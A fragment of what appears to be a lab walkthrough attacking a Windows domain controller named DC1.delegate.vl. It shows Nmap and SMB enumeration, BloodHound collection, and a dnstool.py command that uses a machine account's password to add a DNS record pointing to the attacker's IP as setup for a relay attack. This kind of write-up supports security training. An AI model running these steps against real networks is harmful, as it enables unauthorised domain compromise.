...
Nmap scan report for 10.129.180.141
...
Nmap scan report for DC1.delegate.vl (10.129.180.141)
Host is up (0.12s latency).
...
SMB         10.129.180.141  445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False) (Null Auth:True)
...
Done in 0M 28S
Compressing output into /home/kali/.nxc/logs/DC1_10.129.180.141_2025-10-04_184912_bloodhound.zip
```
...
### Add DNS Record
```
❯ uv run --script /opt/krbrelayx/dnstool.py -u 'delegate.vl\blog$' -p 'BlogBlog.123!' --action add --record blog.delegate.vl --data 10.10.14.168 --type A -dns-ip $target dc1.delegate.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
